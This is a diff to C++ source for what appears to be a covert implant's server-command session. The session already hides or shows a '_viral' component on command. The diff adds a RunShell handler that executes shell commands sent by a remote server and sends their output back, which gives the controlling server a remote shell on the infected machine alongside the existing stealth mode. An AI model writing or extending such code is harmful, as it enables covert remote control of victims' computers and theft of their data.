@@ -28,6 +28,8 @@ namespace spi
                                    proto::MessageType::StealthMode);
             _cmdHandler.onMessages(boost::bind(&ServerCommandSession::__handleActiveMode, this, _1),
                                    proto::MessageType::ActiveMode);
+            _cmdHandler.onMessages(boost::bind(&ServerCommandSession::__handleRunShell, this, _1),
+                                   proto::MessageType::RunShell);
         }
 
         ~ServerCommandSession() noexcept override
@@ -44,15 +46,33 @@ namespace spi
         }
 
     private:
+        void __handleRunShell(const ILoggable &l)
+        {
+            const proto::RunShell &rsh = static_cast<const proto::RunShell &>(l);
+
+            _log(logging::Debug) << "Executing shell command '" << rsh.cmd << "'" << std::endl;
+            auto result = _viral.runShell(rsh.cmd);
+            proto::RawData rd;
+
+            rd.bytes.insert(rd.bytes.end(), result.begin(), result.end());
+            Buffer buff;
+            buff.clear();
+            rd.serialize(buff);
+
+            ErrorCode ec;
+            _conn.writeSome(net::BufferView(buff.data(), buff.size()), ec);
+            _log(logging::Debug) << "Result of command sent to server" << std::endl;
+        }
+
         void __handleStealthMode([[maybe_unused]] const ILoggable &s)
         {
-            _log(logging::Level::Debug) << "Got stealth mode" << std::endl;
+            _log(logging::Debug) << "Got stealth mode" << std::endl;
             _viral.hide();
         }
 
         void __handleActiveMode([[maybe_unused]] const ILoggable &s)
         {
-            _log(logging::Level::Debug) << "Got Active mode" << std::endl;
+            _log(logging::Debug) << "Got Active mode" << std::endl;
             _viral.show();
         }
 
